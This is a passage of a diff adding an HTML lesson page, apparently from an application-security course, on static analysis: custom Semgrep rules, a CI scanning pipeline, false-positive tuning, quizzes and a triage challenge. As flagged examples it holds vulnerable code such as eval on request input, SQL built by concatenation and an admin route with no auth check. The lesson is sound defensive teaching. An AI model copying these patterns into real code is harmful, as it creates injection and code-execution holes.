+          <span class="cv">@login_required</span>        <span class="cm2"># exclude: has @login_required somewhere above</span>
+          ...
+          <span class="cf">def</span> <span class="cv">$FUNC</span>(...):
+              ...
+
+<span class="cm2"># Catches:</span>
+<span class="cr2">@app.route('/admin/users')          # ← FLAGGED: no @login_required</span>
+<span class="cr2">def get_all_users():
+    return jsonify(User.query.all())</span>
+
+<span class="cm2"># Does NOT catch (correct):</span>
+<span class="cg2">@app.route('/admin/users')
+@login_required                     # ← has auth decorator → no finding
+def get_all_users():
+    return jsonify(User.query.all())</span>
+</pre>
+    </div>
+  </div>
+
+  <div class="panel" id="pan-r2">
+    <div class="panel-h" onclick="tp('pan-r2')">
+      <div class="panel-dot" style="background:var(--purple)"></div>
+      <div class="panel-title">Custom Rule 2 — Detect use of requests.get() instead of internal SecureHTTP client</div>
+      <div class="panel-sub">Enforce your org's security wrapper: all outbound HTTP must use SecureHTTP to prevent SSRF</div>
+      <div class="panel-tog">▼</div>
+    </div>
+    <div class="panel-body">
+      <p>Your org has a <code>SecureHTTP</code> wrapper that validates URLs against an allowlist before making requests (preventing SSRF). Policy: no direct use of <code>requests</code> library. SAST enforces this policy automatically.</p>
+<pre>
+rules:
+  - id: <span class="cs">use-secure-http-client</span>
+    message: <span class="cs">"Direct use of requests library is prohibited. Use SecureHTTP from utils.http to prevent SSRF."</span>
+    severity: <span class="cv">ERROR</span>
+    languages: [<span class="cs">python</span>]
+    metadata:
+      cwe: <span class="cs">CWE-918</span>
+      owasp: <span class="cs">A10:2021 - SSRF</span>
+    pattern-either:
+      - pattern: requests.get(...)
+      - pattern: requests.post(...)
+      - pattern: requests.put(...)
+      - pattern: requests.delete(...)
+      - pattern: requests.request(...)
+      - pattern: httpx.get(...)         <span class="cm2"># also covers httpx library</span>
+      - pattern: httpx.post(...)
+    pattern-not-inside: |
+      <span class="cm2"># Allow usage inside the SecureHTTP implementation itself</span>
+      <span class="cf">class</span> SecureHTTP:
+          ...
+
+<span class="cm2"># Usage in tests is allowed via path filter in CI config:</span>
+<span class="cm2"># exclude: ["**/tests/**", "**/test_*.py"]</span>
+</pre>
+    </div>
+  </div>
+
+  <div class="panel" id="pan-r3">
+    <div class="panel-h" onclick="tp('pan-r3')">
+      <div class="panel-dot" style="background:var(--teal)"></div>
+      <div class="panel-title">Custom Rule 3 — Detect eval() and exec() with any non-literal argument</div>
+      <div class="panel-sub">eval/exec with user-supplied input is Remote Code Execution waiting to happen</div>
+      <div class="panel-tog">▼</div>
+    </div>
+    <div class="panel-body">
+<pre>
+rules:
+  - id: <span class="cs">dangerous-eval-exec</span>
+    message: <span class="cs">"eval()/exec() with non-literal argument. If user input reaches this, it's RCE."</span>
+    severity: <span class="cv">ERROR</span>
+    languages: [<span class="cs">python</span>]
+    metadata:
+      cwe: <span class="cs">CWE-95</span>
+      confidence: <span class="cv">HIGH</span>
+    patterns:
+      - pattern-either:
+          - pattern: eval(<span class="cv">$X</span>)
+          - pattern: exec(<span class="cv">$X</span>)
+      - pattern-not: eval(<span class="cs">"..."</span>)     <span class="cm2"># allow: eval("2 + 2") — compile-time literal</span>
+      - pattern-not: exec(<span class="cs">"..."</span>)     <span class="cm2"># allow: exec("pass") — literal string</span>
+
+<span class="cm2"># Catches all of these:</span>
+<span class="cr2">eval(user_input)                    # ← obvious</span>
+<span class="cr2">eval(request.json['formula'])       # ← tainted source</span>
+<span class="cr2">code = get_user_template()          # ← indirect</span>
+<span class="cr2">eval(code)                          # ← still caught</span>
+
+<span class="cm2"># Does NOT catch (allowed):</span>
+<span class="cg2">eval("2 + 2")                       # ← compile-time literal, not user-controlled</span>
+</pre>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════ ADVANCED: CI/CD INTEGRATION -->
+<div class="section">
+  <div class="eyebrow">🔴 Advanced — CI/CD Integration</div>
+  <div class="sec-title">SAST in your CI/CD pipeline — full configuration</div>
+  <div class="sec-sub">SAST only delivers value if it runs automatically on every commit and blocks the pipeline on real findings. Here is the complete setup for a production-grade SAST CI gate.</div>
+
+  <!-- Pipeline stages -->
+  <div class="pipe-wrap" id="pipe">
+    <div class="pipe-stage act" id="ps-precommit" onclick="activePipe('precommit')">
+      <div class="pipe-top" style="background:var(--green)"></div>
+      <div class="pipe-inner">
+        <div class="pipe-num">Stage 1</div>
+        <div class="pipe-name">Pre-commit</div>
+        <div class="pipe-tag">Developer's machine</div>
+      </div>
+      <div class="pipe-detail">Fastest feedback. Runs Bandit + detect-secrets before any code reaches git. Developer fixes issues locally — no CI queue wait. Can be bypassed with <code>--no-verify</code>, so not the enforcement layer.</div>
+    </div>
+    <div class="pipe-stage" id="ps-pr" onclick="activePipe('pr')">
+      <div class="pipe-top" style="background:var(--blue)"></div>
+      <div class="pipe-inner">
+        <div class="pipe-num">Stage 2</div>
+        <div class="pipe-name">Pull Request</div>
+        <div class="pipe-tag">CI — cannot bypass</div>
+      </div>
+      <div class="pipe-detail">The real enforcement gate. Runs full Semgrep scan on changed files. Posts inline PR comments on findings. Blocks merge if HIGH or CRITICAL findings exist. Developers see findings before code review even starts.</div>
+    </div>
+    <div class="pipe-stage" id="ps-merge" onclick="activePipe('merge')">
+      <div class="pipe-top" style="background:var(--accent)"></div>
+      <div class="pipe-inner">
+        <div class="pipe-num">Stage 3</div>
+        <div class="pipe-name">Merge to Main</div>
+        <div class="pipe-tag">Full codebase scan</div>
+      </div>
+      <div class="pipe-detail">Full codebase scan — not just changed files. Catches regressions where a new file creates a vulnerable pattern with an existing file. Slower (5–15 min) but comprehensive. Results pushed to SonarQube dashboard for trend tracking.</div>
+    </div>
+    <div class="pipe-stage" id="ps-nightly" onclick="activePipe('nightly')">
+      <div class="pipe-top" style="background:var(--purple)"></div>
+      <div class="pipe-inner">
+        <div class="pipe-num">Stage 4</div>
+        <div class="pipe-name">Nightly</div>
+        <div class="pipe-tag">Deep scan + new rules</div>
+      </div>
+      <div class="pipe-detail">Full CodeQL analysis — the most thorough but slowest (can take 30+ minutes). Runs updated rule packs to catch issues with newly published CVE patterns. Results to security team inbox as a daily digest. Also runs custom org rules against full history.</div>
+    </div>
+    <div class="pipe-stage" id="ps-release" onclick="activePipe('release')">
+      <div class="pipe-top" style="background:var(--red)"></div>
+      <div class="pipe-inner">
+        <div class="pipe-num">Stage 5</div>
+        <div class="pipe-name">Pre-release Gate</div>
+        <div class="pipe-tag">Hard block on deploy</div>
+      </div>
+      <div class="pipe-detail">Final hard gate: zero HIGH or CRITICAL findings allowed. Any unresolved HIGH+ finding blocks deployment to production. All suppressions must have an approved risk acceptance ticket number. Security lead must manually approve exceptions.</div>
+    </div>
+  </div>
+
+  <!-- Full GitHub Actions SAST config -->
+  <div style="margin-top:1.5rem;">
+    <div class="eyebrow">Complete GitHub Actions Configuration</div>
+  </div>
+<pre>
+<span class="cm2"># .github/workflows/sast.yml</span>
+name: <span class="cs">SAST Security Scan</span>
+
+on:
+  pull_request: { branches: [main, production] }
+  push: { branches: [main] }
+  schedule:
+    - cron: <span class="cs">'0 2 * * *'</span>    <span class="cm2"># nightly at 2am UTC</span>
+
+jobs:
+
+  <span class="cm2"># ─── Gate 1: Bandit — Python SAST ───────────────────────────────</span>
+  bandit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with: { python-version: <span class="cs">'3.12'</span> }
+
+      - name: <span class="cs">Install Bandit</span>
+        run: pip install bandit[toml]
+
+      - name: <span class="cs">Run Bandit SAST</span>
+        run: |
+          bandit -r src/ \
+            -c pyproject.toml \        <span class="cm2"># your config file (suppression list lives here)</span>
+            -f json \
+            -o bandit-results.json \
+            --exit-zero                <span class="cm2"># don't fail here — custom threshold below</span>
+
+      - name: <span class="cs">Enforce severity threshold</span>
+        run: |
+          HIGH=$(jq <span class="cs">'[.results[] | select(.issue_severity=="HIGH")] | length'</span> bandit-results.json)
+          CRIT=$(jq <span class="cs">'[.results[] | select(.issue_severity=="CRITICAL")] | length'</span> bandit-results.json)
+          echo <span class="cs">"HIGH: $HIGH  CRITICAL: $CRIT"</span>
+          <span class="cf">if</span> [ $((HIGH + CRIT)) -gt 0 ]; <span class="cf">then</span>
+            echo <span class="cs">"::error::SAST gate failed — $CRIT critical, $HIGH high findings"</span>
+            exit 1
+          <span class="cf">fi</span>
+
+      - name: <span class="cs">Upload results as artifact</span>
+        uses: actions/upload-artifact@v4
+        if: always()                   <span class="cm2"># upload even on failure</span>
+        with:
+          name: bandit-results
+          path: bandit-results.json
+
+  <span class="cm2"># ─── Gate 2: Semgrep — Multi-language SAST ──────────────────────</span>
+  semgrep:
+    runs-on: ubuntu-latest
+    container:
+      image: semgrep/semgrep
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: <span class="cs">Run Semgrep with OWASP Top 10 rules</span>
+        run: |
+          semgrep \
+            --config p/owasp-top-ten \      <span class="cm2"># OWASP Top 10 rule pack</span>
+            --config p/python \             <span class="cm2"># Python security rules</span>
+            --config p/secrets \            <span class="cm2"># secret detection</span>
+            --config .semgrep/             \<span class="cm2"> # your custom rules directory</span>
+            --severity ERROR \              <span class="cm2"># only surface ERROR severity</span>
+            --error \                       <span class="cm2"># exit non-zero on findings</span>
+            --json \
+            -o semgrep-results.json \
+            --exclude "tests/" \            <span class="cm2"># don't scan test files</span>
+            --exclude "migrations/"         <span class="cm2"># don't scan DB migrations</span>
+
+      - name: <span class="cs">Post PR comments on findings</span>
+        uses: actions/github-script@v7
+        if: failure() && github.event_name == 'pull_request'
+        with:
+          script: |
+            const fs = require('fs');
+            const results = JSON.parse(fs.readFileSync('semgrep-results.json'));
+            for (const finding of results.results.slice(0, 10)) {  <span class="cm2">// max 10 comments</span>
+              await github.rest.pulls.createReviewComment({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                pull_number: context.issue.number,
+                body: `🔴 **SAST Finding**: ${finding.check_id}\n${finding.extra.message}`,
+                path: finding.path,
+                line: finding.start.line
+              });
+            }
+
+  <span class="cm2"># ─── Gate 3: CodeQL — Deep analysis (runs on push to main) ──────</span>
+  codeql:
+    runs-on: ubuntu-latest
+    if: github.event_name == 'push' || github.event_name == 'schedule'
+    permissions:
+      security-events: write    <span class="cm2"># required for CodeQL</span>
+    steps:
+      - uses: actions/checkout@v4
+      - uses: github/codeql-action/init@v3
+        with:
+          languages: python
+          queries: security-extended    <span class="cm2"># extended security query pack</span>
+      - uses: github/codeql-action/autobuild@v3
+      - uses: github/codeql-action/analyze@v3
+        with:
+          category: /language:python
+          upload: true           <span class="cm2"># uploads to GitHub Security tab</span>
+</pre>
+</div>
+
+<!-- ══════════════════════════════════════════ ADVANCED: TUNING FALSE POSITIVES -->
+<div class="section">
+  <div class="eyebrow">🔴 Advanced — Suppression &amp; Tuning</div>
+  <div class="sec-title">Managing false positives — keeping signal high</div>
+  <div class="sec-sub">A SAST tool generating 400 weekly findings that are mostly false positives is worse than no SAST at all — it trains your team to ignore security alerts. Tuning is as important as scanning.</div>
+
+  <div class="callout cl-warn">
+    <div class="cl-icon">⚠️</div>
+    <div class="cl-text"><strong>Alert fatigue is the #1 reason SAST programs fail:</strong> When developers see 400 findings and know 350 are false positives, they stop reading them entirely. Then the 50 real findings get missed too. Your job as AppSec engineer is to maintain a false positive rate below 20% — otherwise your tool is producing noise, not signal.</div>
+  </div>
+
+  <div class="panel" id="pan-suppress">
+    <div class="panel-h" onclick="tp('pan-suppress')">
+      <div class="panel-dot" style="background:var(--yellow)"></div>
+      <div class="panel-title">Inline suppressions — per-line and per-file</div>
+      <div class="panel-sub">When a finding is confirmed false positive, suppress it with documentation</div>
+      <div class="panel-tog">▼</div>
+    </div>
+    <div class="panel-body">
+<pre>
+<span class="cm2"># Bandit: suppress a specific finding on one line</span>
+result = hashlib.md5(data).hexdigest()  <span class="cm2"># nosec B324 — MD5 used for non-security cache key, not passwords</span>
+
+<span class="cm2"># Bandit: suppress multiple rules on one line</span>
+subprocess.call(cmd, shell=<span class="ck">True</span>)  <span class="cm2"># nosec B602,B603 — cmd constructed from config file only, not user input</span>
+
+<span class="cm2"># Semgrep: suppress on next line</span>
+<span class="cm2"># nosemgrep: use-secure-http-client</span>
+response = requests.get(INTERNAL_HEALTH_CHECK_URL)  <span class="cm2"># hardcoded URL, not user-controlled</span>
+
+<span class="cm2"># IMPORTANT: suppressions must explain WHY they are safe</span>
+<span class="cm2"># "nosec" with no comment = rejected in code review</span>
+<span class="cm2"># Good: # nosec B324 — MD5 for cache key fingerprint, not used for authentication or passwords</span>
+<span class="cm2"># Bad:  # nosec  ← explains nothing, could be lazy suppression of real vuln</span>
+</pre>
+
+      <h4>Baseline suppression — ignoring existing technical debt</h4>
+<pre>
+<span class="cm2"># When first adding SAST to an existing codebase,</span>
+<span class="cm2"># you'll have hundreds of findings in legacy code.</span>
+<span class="cm2"># Create a baseline to only surface NEW findings from now on.</span>
+
+<span class="cm2"># Semgrep: generate baseline</span>
+$ semgrep --config p/owasp-top-ten --json > .semgrep-baseline.json
+
+<span class="cm2"># Future runs compare against baseline — only show new findings</span>
+$ semgrep --config p/owasp-top-ten --baseline-commit main
+
+<span class="cm2"># Bandit: generate baseline (different approach)</span>
+$ bandit -r src/ -f json | python -m bandit.formatters.baseline > .bandit_baseline
+
+<span class="cm2"># Schedule: review and fix 5 baseline findings per sprint</span>
+<span class="cm2"># → baseline shrinks to zero over 6–12 months</span>
+<span class="cm2"># → eventually delete baseline file entirely</span>
+</pre>
+    </div>
+  </div>
+
+  <div class="panel" id="pan-policy">
+    <div class="panel-h" onclick="tp('pan-policy')">
+      <div class="panel-dot" style="background:var(--green)"></div>
+      <div class="panel-title">pyproject.toml — Bandit configuration and suppression policy</div>
+      <div class="panel-sub">Centralize your SAST configuration in the repo — not scattered across CI scripts</div>
+      <div class="panel-tog">▼</div>
+    </div>
+    <div class="panel-body">
+<pre>
+<span class="cm2"># pyproject.toml — Bandit config section</span>
+[tool.bandit]
+<span class="cm2"># Tests to skip globally (with justification):</span>
+skips = [
+  <span class="cs">"B101"</span>,   <span class="cm2"># assert_used — we use asserts in tests intentionally</span>
+  <span class="cs">"B404"</span>,   <span class="cm2"># subprocess import — used for build tooling, reviewed</span>
+]
+
+<span class="cm2"># Directories to exclude from scanning:</span>
+exclude_dirs = [
+  <span class="cs">"tests/"</span>,
+  <span class="cs">"migrations/"</span>,
+  <span class="cs">"scripts/dev/"</span>,
+]
+
+<span class="cm2"># Minimum severity to report (LOW/MEDIUM/HIGH):</span>
+level = <span class="cs">"MEDIUM"</span>      <span class="cm2"># don't report LOW findings — too much noise</span>
+
+<span class="cm2"># Minimum confidence to report:</span>
+confidence = <span class="cs">"MEDIUM"</span>  <span class="cm2"># don't report low-confidence guesses</span>
+
+
+<span class="cm2"># .semgrep/policy.yml — Semgrep organization policy</span>
+rules:
+  - id: <span class="cs">policy-enforce-type-hints</span>       <span class="cm2"># company standard — all API params must be typed</span>
+    ...
+
+<span class="cm2"># .semgrep/.semgrepignore — paths to exclude (like .gitignore syntax)</span>
+tests/
+docs/
+*.min.js
+**/migrations/
+vendor/
+</pre>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════ QUIZ -->
+<div class="section">
+  <div class="eyebrow">Knowledge Check</div>
+  <div class="sec-title">SAST interview questions</div>
+  <div class="sec-sub">Every AppSec interview includes at least one SAST question — usually about false positives or tool selection</div>
+
+  <div class="quiz-block">
+    <div class="quiz-q">Q1. A developer asks you: "I see a Bandit finding B601 — SQL injection — but we're using SQLAlchemy ORM. How can there be a SQL injection?" What is your answer?</div>
+    <div class="quiz-opts" id="q1">
+      <div class="qo" onclick="doQ('q1',this,'wrong')">It's definitely a false positive — SQLAlchemy ORM is completely safe from SQL injection by design</div>
+      <div class="qo" onclick="doQ('q1',this,'correct')">SQLAlchemy ORM is safe when you use ORM query methods. But SQLAlchemy also supports raw SQL via <code>text()</code> and <code>execute()</code> — if you build those strings with f-strings or concatenation, you have SQLi even with SQLAlchemy. Show me the line number and we'll check.</div>
+      <div class="qo" onclick="doQ('q1',this,'wrong')">Suppress the finding — ORMs prevent SQL injection completely</div>
+      <div class="qo" onclick="doQ('q1',this,'wrong')">Replace SQLAlchemy with a different ORM that doesn't have this problem</div>
+    </div>
+    <div class="quiz-exp" id="q1-exp">This is a critical distinction. SQLAlchemy ORM methods like <code>User.query.filter_by(name=name)</code> are safe — they parameterize automatically. But <code>db.execute(text(f"SELECT * FROM users WHERE name='{name}'"))</code> is not safe — you've bypassed ORM safety. SAST tools flag the latter correctly. The real answer: investigate the specific line. Never suppress without checking.</div>
+  </div>
+
+  <div class="quiz-block">
+    <div class="quiz-q">Q2. Your SAST scan is running in CI and producing 300 findings per week. Developers have stopped reading the reports. What are the 4 steps you take to fix this situation?</div>
+    <div class="quiz-opts" id="q2">
+      <div class="qo" onclick="doQ('q2',this,'wrong')">Remove SAST from CI — it's creating too much friction and reducing developer productivity</div>
+      <div class="qo" onclick="doQ('q2',this,'wrong')">Make all findings mandatory to fix before merge — this forces developers to engage</div>
+      <div class="qo" onclick="doQ('q2',this,'correct')">1) Create a baseline to suppress existing findings — only surface NEW ones. 2) Increase severity threshold to MEDIUM+ — suppress LOW. 3) Write suppression docs for confirmed false positives. 4) Block merge only on CRITICAL/HIGH — MEDIUM goes to backlog. Result: ~10 actionable findings/week instead of 300.</div>
+      <div class="qo" onclick="doQ('q2',this,'wrong')">Switch to a different SAST tool that has fewer findings</div>
+    </div>
+    <div class="quiz-exp" id="q2-exp">Alert fatigue is a process problem, not a tool problem. The solution is signal-to-noise management: (1) <strong>Baseline</strong> all existing findings so you only flag new regressions. (2) <strong>Severity filtering</strong> — only surface what matters. (3) <strong>False positive suppression</strong> with <code># nosec</code> and documented justification. (4) <strong>Gate only on HIGH+</strong> — MEDIUM findings become sprint backlog items, not merge blockers. Target: developers see 5–15 actionable findings per week maximum.</div>
+  </div>
+
+  <div class="quiz-block">
+    <div class="quiz-q">Q3. What is taint analysis, and why does SAST using taint analysis find more vulnerabilities than pattern-matching only?</div>
+    <div class="quiz-opts" id="q3">
+      <div class="qo" onclick="doQ('q3',this,'wrong')">Taint analysis checks for code smells and style issues. Pattern matching finds security vulnerabilities.</div>
+      <div class="qo" onclick="doQ('q3',this,'wrong')">Taint analysis scans the running application's memory. Pattern matching scans source code.</div>
+      <div class="qo" onclick="doQ('q3',this,'correct')">Taint analysis tracks user-controlled data from sources (request.args) through all assignments and function calls to sinks (db.execute). Pattern matching only finds vulnerabilities where the source and sink are on the same line or in obvious proximity. Taint analysis finds multi-hop flows — where user input passes through 3 functions before reaching the sink.</div>
+      <div class="qo" onclick="doQ('q3',this,'wrong')">They are equivalent — taint analysis is just a more modern term for pattern matching.</div>
+    </div>
+    <div class="quiz-exp" id="q3-exp">Pattern matching: if <code>db.execute("..." + user_input)</code> then flag. Works for simple cases. Misses: <code>sanitized = sanitize(user_input); result = wrap(sanitized); db.execute(result)</code> — is it actually sanitized? Taint analysis follows the variable: user_input → sanitize() → does sanitize() clear the taint? If yes, no finding. If no (e.g., sanitize() only strips spaces, not SQL metacharacters), the taint continues → finding. This is why CodeQL (full taint analysis) finds real vulnerabilities that Bandit (pattern matching) misses.</div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════ CHALLENGE -->
+<div class="challenge">
+  <div class="ch-ey">Capstone Challenge — Beginner to Advanced</div>
+  <div class="ch">
+    <h3>Triage this SAST report &amp; write a custom rule</h3>
+    <p class="ch-desc">Below are 5 SAST findings from a real Django application. For each: state whether it's a TRUE POSITIVE or FALSE POSITIVE, give your reasoning, and write the fix. Then write a Semgrep rule for the vulnerability pattern in Finding 1.</p>
+    <div class="scenario">
+      <p><strong>Finding 1 — B608 (HIGH):</strong> <code>query = "SELECT * FROM accounts WHERE user_id=" + str(user_id)</code> in <code>reports/generator.py:88</code>. The <code>user_id</code> comes from <code>request.user.id</code> (the Django authenticated user object — set by Django's auth middleware from the session, not from the request body).<br><br>
+      <strong>Finding 2 — B303 (MEDIUM):</strong> <code>hashlib.sha256(token.encode()).hexdigest()</code> in <code>auth/tokens.py:15</code>. Used to create a one-time password reset token that is emailed to the user and expires in 10 minutes.<br><br>
+      <strong>Finding 3 — B105 (HIGH):</strong> <code>API_KEY = "test-key-do-not-use-in-prod"</code> in <code>tests/test_integration.py:5</code>. This is a test fixture file used only in CI against a mock API server.<br><br>
+      <strong>Finding 4 — B324 (HIGH):</strong> <code>file_hash = hashlib.md5(open(filepath).read()).hexdigest()</code> in <code>storage/dedup.py:44</code>. Used to detect duplicate file uploads — not for authentication or password storage.<br><br>
+      <strong>Finding 5 — B701 (HIGH):</strong> <code>template = jinja2.Template(user_template_string)</code> in <code>notifications/email.py:31</code>. <code>user_template_string</code> is loaded from the database — it was entered by an admin user in the admin panel, not by end users.</p>
+    </div>
+    <textarea id="ch-ans" placeholder="Finding 1: TRUE/FALSE POSITIVE — Reasoning: ... — Fix: ...
+Finding 2: TRUE/FALSE POSITIVE — Reasoning: ... — Fix: ...
+Finding 3: TRUE/FALSE POSITIVE — Reasoning: ... — Fix: ...
+Finding 4: TRUE/FALSE POSITIVE — Reasoning: ... — Fix: ...
+Finding 5: TRUE/FALSE POSITIVE — Reasoning: ... — Fix: ...
+
+Semgrep Rule for Finding 1:
+rules:
+  - id: ..."></textarea>
+    <div class="btn-row">
+      <button class="btn btn-p" onclick="checkCh()">Submit</button>
+      <button class="btn btn-g" onclick="revealCh()">Reveal model answer</button>
+    </div>
+    <div class="ch-fb" id="ch-fb"></div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════ SUMMARY -->
+<div class="section">
+  <div class="eyebrow">Quick Reference</div>
+  <div class="sec-title">SAST cheat sheet</div>
+  <table>
+    <tr><th>Concept</th><th>What it means</th><th>Key tool / pattern</th></tr>
+    <tr><td style="font-weight:700;color:var(--green)">AST</td><td>Abstract Syntax Tree — how SAST represents your code as a structured tree for analysis</td><td>All SAST tools use this internally</td></tr>
+    <tr><td style="font-weight:700;color:var(--blue)">Taint analysis</td><td>Tracks untrusted data from source → through code → to sink, flagging unguarded paths</td><td>CodeQL (best), Semgrep Pro, SonarQube Dev+</td></tr>
+    <tr><td style="font-weight:700;color:var(--accent)">Source</td><td>Entry point of untrusted data: request.args, request.form, request.json, file upload</td><td>SAST rule's taint source definition</td></tr>
+    <tr><td style="font-weight:700;color:var(--red)">Sink</td><td>Dangerous operation: db.execute(), os.system(), open(), pickle.loads(), requests.get()</td><td>SAST rule's taint sink definition</td></tr>
+    <tr><td style="font-weight:700;color:var(--green)">Sanitizer</td><td>Function that clears the taint: parameterized query, escape(), validate()</td><td>Breaks source→sink chain → no finding</td></tr>
+    <tr><td style="font-weight:700;color:var(--green)">Bandit</td><td>Python-only, pattern-matching SAST, fast, free, good for CI gate</td><td><code>bandit -r src/ -ll</code></td></tr>
+    <tr><td style="font-weight:700;color:var(--accent)">Semgrep</td><td>Multi-language, custom rules, community library, OSS core</td><td><code>semgrep --config p/owasp-top-ten</code></td></tr>
+    <tr><td style="font-weight:700;color:var(--blue)">SonarQube</td><td>Enterprise SAST + code quality, dashboard, PR decoration, quality gates</td><td>Community edition free</td></tr>
+    <tr><td style="font-weight:700;color:var(--purple)">CodeQL</td><td>Query-based, most accurate taint analysis, GitHub native, used by security researchers</td><td>Free for OSS via GitHub Advanced Security</td></tr>
+    <tr><td style="font-weight:700;color:var(--yellow)"># nosec</td><td>Inline suppression with mandatory justification comment</td><td><code># nosec B324 — MD5 for cache key, not password</code></td></tr>
+    <tr><td style="font-weight:700;color:var(--teal)">Baseline</td><td>Snapshot of existing findings so CI only surfaces new regressions</td><td>Fixes alert fatigue on legacy codebases</td></tr>
+  </table>
+</div>
+
+<!-- NAV FOOTER -->
+<div class="nav-footer">
+  <a class="nf-btn" href="#">
+    <span class="nf-dir">← Previous</span>
+    <span class="nf-title">03 — Threat Modeling (STRIDE, PASTA)</span>
+  </a>
+  <a class="nf-btn next" href="#">
+    <span class="nf-dir">Next Lesson →</span>
+    <span class="nf-title">05 — DAST (Dynamic Application Security Testing)</span>
+  </a>
+</div>
+
+</div><!-- /content -->
+</div><!-- /main -->
+
+<script>
+// Panel toggle
+function tp(id){document.getElementById(id).classList.toggle('open');}
+document.getElementById('pan-ast').classList.add('open');
+
+// Finding expand
+function toggleF(id){
+  const d = document.getElementById(id+'-d');
+  d.classList.toggle('show');
+}
+
+// Pipeline
+function activePipe(id){
+  document.querySelectorAll('.pipe-stage').forEach(s=>s.classList.remove('act'));
+  document.getElementById('ps-'+id).classList.add('act');
+}
+
+// Tool detail content
+const toolDetails = {
+  bandit: {
+    color: 'var(--green)',
+    content: `
+<div style="padding:1.25rem;background:var(--surface2);border:1px solid var(--border);border-radius:0 0 6px 6px;margin-top:-1px;">
+<div style="font-family:'Inconsolata',monospace;font-size:10px;text-transform:uppercase;letter-spacing:.1em;color:var(--green);margin-bottom:.75rem;font-weight:700;">Bandit — Deep Dive</div>
+<p style="font-size:13.5px;color:var(--ink2);line-height:1.75;margin-bottom:1rem;">Bandit works by walking Python's AST and applying a set of test plugins to each node. Each plugin checks for a specific dangerous pattern. It's intentionally simple — no cross-file analysis, no taint tracking. This makes it extremely fast (seconds on large codebases) but means it misses multi-function vulnerabilities.</p>
+<pre style="font-size:12.5px;">
+<span class="cm2"># Installation and basic usage</span>
+$ pip install bandit[toml]
+
+<span class="cm2"># Scan a directory, show only MEDIUM+ severity and MEDIUM+ confidence</span>
+$ bandit -r ./src -ll -ii
+
+<span class="cm2"># Scan with custom config (pyproject.toml)</span>
+$ bandit -r ./src -c pyproject.toml
+
+<span class="cm2"># Output formats: text (default), json, csv, xml, html</span>
+$ bandit -r ./src -f json -o results.json
+
+<span class="cm2"># Key Bandit test IDs to know:</span>
+<span class="cm2"># B101: assert_used           B105: hardcoded_password</span>
+<span class="cm2"># B301: pickle                B302: marshal</span>
+<span class="cm2"># B303: md5/sha1 (in crypto)  B324: md5/sha1 (general)</span>
+<span class="cm2"># B501: request_with_no_cert_validation</span>
+<span class="cm2"># B601: paramiko_calls        B602: subprocess_popen_with_shell_equals_true</span>
+<span class="cm2"># B608: hardcoded_sql_expressions</span>
+<span class="cm2"># B701: jinja2_autoescape_false</span>
+</pre>
+</div>`
+  },
+  semgrep: {
+    color: 'var(--accent)',
+    content: `
+<div style="padding:1.25rem;background:var(--surface2);border:1px solid var(--border);border-radius:0 0 6px 6px;margin-top:-1px;">
+<div style="font-family:'Inconsolata',monospace;font-size:10px;text-transform:uppercase;letter-spacing:.1em;color:var(--accent);margin-bottom:.75rem;font-weight:700;">Semgrep — Deep Dive</div>
+<p style="font-size:13.5px;color:var(--ink2);line-height:1.75;margin-bottom:1rem;">Semgrep's core insight: rules look like the code they match. You write <code>requests.get($URL)</code> and it matches every call to requests.get() with any URL argument. This makes writing rules fast and intuitive. The community registry has 4,000+ rules covering every major framework and vulnerability type.</p>
+<pre style="font-size:12.5px;">
+<span class="cm2"># Installation</span>
+$ pip install semgrep
+
+<span class="cm2"># Run OWASP Top 10 rules on your codebase</span>
+$ semgrep --config p/owasp-top-ten ./src
+
+<span class="cm2"># Run multiple rule packs</span>
+$ semgrep --config p/python --config p/secrets --config p/flask ./src
+
+<span class="cm2"># Run your custom rules</span>
+$ semgrep --config ./rules/ ./src
+
+<span class="cm2"># Test a rule against test cases</span>
+$ semgrep --test ./rules/
+
+<span class="cm2"># Key rule packs:</span>
+<span class="cm2"># p/owasp-top-ten      — mapped to OWASP A01-A10</span>
+<span class="cm2"># p/python             — Python-specific security</span>
+<span class="cm2"># p/django             — Django framework security</span>
+<span class="cm2"># p/flask              — Flask framework security</span>
+<span class="cm2"># p/secrets            — API keys, passwords, tokens</span>
+<span class="cm2"># p/jwt                — JWT misuse patterns</span>
+<span class="cm2"># p/sql-injection      — SQLi patterns</span>
+<span class="cm2"># p/xss                — XSS patterns</span>
+</pre>
+</div>`
+  },
+  sonar: {
+    color: 'var(--blue)',
+    content: `
+<div style="padding:1.25rem;background:var(--surface2);border:1px solid var(--border);border-radius:0 0 6px 6px;margin-top:-1px;">
+<div style="font-family:'Inconsolata',monospace;font-size:10px;text-transform:uppercase;letter-spacing:.1em;color:var(--blue);margin-bottom:.75rem;font-weight:700;">SonarQube — Deep Dive</div>
+<p style="font-size:13.5px;color:var(--ink2);line-height:1.75;margin-bottom:1rem;">SonarQube is a platform, not just a scanner. It stores historical data, tracks trends, and integrates into developer workflows via PR decoration. Its "Quality Gate" concept is powerful: you define conditions (e.g., "no new critical issues, code coverage > 80%, no new security hotspots") and every PR must pass the gate to merge.</p>
+<pre style="font-size:12.5px;">
+<span class="cm2"># Run SonarQube Community via Docker</span>
+$ docker run -d --name sonarqube -p 9000:9000 sonarqube:community
+
+<span class="cm2"># Add to your project (sonar-project.properties)</span>
+sonar.projectKey=my-app
+sonar.projectName=My App
+sonar.sources=src
+sonar.exclusions=**/tests/**,**/migrations/**
+sonar.python.version=3.12
+
+<span class="cm2"># Run analysis</span>
+$ sonar-scanner
+
+<span class="cm2"># Quality Gate (defined in SonarQube UI):</span>
+<span class="cm2"># New code: 0 critical issues</span>
+<span class="cm2"># New code: 0 high security hotspots unreviewed</span>
+<span class="cm2"># New code: code coverage >= 80%</span>
+<span class="cm2"># Overall: no issues rated E (debt > 30 days)</span>
+
+<span class="cm2"># SonarQube security categories map to CWE and OWASP</span>
+<span class="cm2"># Security Hotspots = human review needed (not auto-flagged as bugs)</span>
+<span class="cm2"># Vulnerabilities = confirmed security issues</span>
+</pre>
+</div>`
+  },
+  codeql: {
+    color: 'var(--purple)',
+    content: `
+<div style="padding:1.25rem;background:var(--surface2);border:1px solid var(--border);border-radius:0 0 6px 6px;margin-top:-1px;">
